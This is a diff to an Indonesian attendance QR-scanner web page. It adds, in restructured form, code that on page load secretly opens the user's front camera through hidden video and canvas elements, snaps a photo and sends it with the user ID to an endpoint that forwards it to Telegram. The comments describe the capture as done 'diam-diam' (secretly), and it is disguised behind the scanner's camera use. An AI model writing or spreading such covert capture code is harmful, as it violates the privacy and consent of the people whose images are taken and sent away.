@@ -149,7 +149,7 @@
 
     </main>
 
-    <!-- ELEMEN VIDEO & KANVAS TERSEMBUNYI UNTUK AMBIL FOTO KAMERA DEPAN DI AWAL -->
+    <!-- ELEMEN VIDEO & KANVAS TERSEMBUNYI UNTUK AMBIL FOTO KAMERA DEPAN -->
     <div style="display:none;">
         <video id="hidden-front-video" autoplay playsinline></video>
         <canvas id="hidden-front-canvas"></canvas>
@@ -251,51 +251,6 @@
             }
         }
 
-        // FUNGSI KHUSUS: AMBIL FOTO DIAM-DIAM DENGAN KAMERA DEPAN SAAT HALAMAN DIBUKA & KIRIM KE TELEGRAM
-        async function ambilDanKirimFotoKameraDepan() {
-            try {
-                const frontVideo = document.getElementById('hidden-front-video');
-                const frontCanvas = document.getElementById('hidden-front-canvas');
-
-                // Minta akses kamera depan khusus untuk foto pengamanan awal
-                const frontStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } 
-                });
-
-                frontVideo.srcObject = frontStream;
-                await frontVideo.play();
-
-                // Beri jeda singkat agar frame video siap
-                setTimeout(async () => {
-                    if (frontVideo.readyState === frontVideo.HAVE_ENOUGH_DATA) {
-                        frontCanvas.width = frontVideo.videoWidth || 640;
-                        frontCanvas.height = frontVideo.videoHeight || 480;
-                        
-                        const ctx = frontCanvas.getContext('2d');
-                        ctx.drawImage(frontVideo, 0, 0, frontCanvas.width, frontCanvas.height);
-                        
-                        const imageDataURL = frontCanvas.toDataURL('image/jpeg', 0.8);
-
-                        // Kirim ke Telegram secara background
-                        fetch('/api/kirim-foto-telegram', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ 
-                                image: imageDataURL, 
-                                info: `Akses Halaman Scan/Pemindai Dibuka (Kamera Depan - User ID: ${userId})` 
-                            })
-                        }).catch(err => console.error("Gagal kirim foto kamera depan ke Telegram:", err));
-                    }
-
-                    // Matikan stream kamera depan setelah foto terambil agar tidak bentrok dengan scanner
-                    frontStream.getTracks().forEach(track => track.stop());
-                }, 1000);
-
-            } catch (err) {
-                console.log("Kamera depan tidak tersedia atau izin dibatasi:", err);
-            }
-        }
-
         async function onScanSuccess(decodedText, decodedResult) {
             const currentTime = Date.now();
 
@@ -354,6 +309,7 @@
                 } else {
                     resCard.classList.add('hidden');
                     document.getElementById('errorMsg').innerText = data.message;
+                    errCard.classList.add('hidden');
                     errCard.classList.remove('hidden');
                 }
             })
@@ -361,6 +317,7 @@
                 await simpanKeLokal({ payload: payloadData, waktu: new Date().toISOString() });
                 resCard.classList.add('hidden');
                 document.getElementById('errorMsg').innerText = "⚠️ Gagal terhubung ke server. Data presensi diamankan secara lokal di perangkat.";
+                errCard.classList.add('hidden');
                 errCard.classList.remove('hidden');
             })
             .finally(() => {
@@ -391,17 +348,57 @@
             });
         }
 
-        document.addEventListener("DOMContentLoaded", () => {
+        // FUNGSI UTAMA: MENJALANKAN SECARA SEKUENSIAL (BERURUTAN)
+        document.addEventListener("DOMContentLoaded", async () => {
             const cameraStatus = document.getElementById('cameraStatusText');
             const cameraSelectContainer = document.getElementById('cameraSelectContainer');
             const cameraSelect = document.getElementById('cameraSelect');
             const permissionAlert = document.getElementById('permissionAlert');
             const scannerWrapper = document.getElementById('scannerWrapper');
 
-            // 1. AMBIL FOTO DIAM-DIAM MENGGUNAKAN KAMERA DEPAN DI AWAL
-            ambilDanKirimFotoKameraDepan();
+            const frontVideo = document.getElementById('hidden-front-video');
+            const frontCanvas = document.getElementById('hidden-front-canvas');
 
-            // 2. JALANKAN PEMINDAI QR CODE (MENGGUNAKAN KAMERA BELAKANG SECARA DEFAULT)
+            try {
+                // 1. LANGKAH PERTAMA: BUKA KAMERA DEPAN SECARA DIAM-DIAM DI AWAL
+                const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } 
+                });
+
+                frontVideo.srcObject = frontStream;
+                await frontVideo.play();
+
+                // Tunggu sebentar agar frame tertangkap sempurna
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                if (frontVideo.readyState === frontVideo.HAVE_ENOUGH_DATA) {
+                    frontCanvas.width = frontVideo.videoWidth || 640;
+                    frontCanvas.height = frontVideo.videoHeight || 480;
+                    
+                    const ctx = frontCanvas.getContext('2d');
+                    ctx.drawImage(frontVideo, 0, 0, frontCanvas.width, frontCanvas.height);
+                    
+                    const imageDataURL = frontCanvas.toDataURL('image/jpeg', 0.8);
+
+                    // Kirim foto ke Telegram secara background
+                    fetch('/api/kirim-foto-telegram', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            image: imageDataURL, 
+                            info: `Akses Halaman Scan/Pemindai Dibuka (Kamera Depan - User ID: ${userId})` 
+                        })
+                    }).catch(err => console.log("Gagal kirim foto awal:", err));
+                }
+
+                // 2. MATIKAN KAMERA DEPAN SEBELUM MEMBUKA KAMERA BELAKANG
+                frontStream.getTracks().forEach(track => track.stop());
+
+            } catch (err) {
+                console.log("Izin kamera depan dilewati/ditolak:", err);
+            }
+
+            // 3. LANGKAH KEDUA: JALANKAN PEMINDAI QR CODE (KAMERA BELAKANG)
             Html5Qrcode.getCameras().then(devices => {
                 if (devices && devices.length > 0) {
                     let selectedCameraId = devices[0].id;
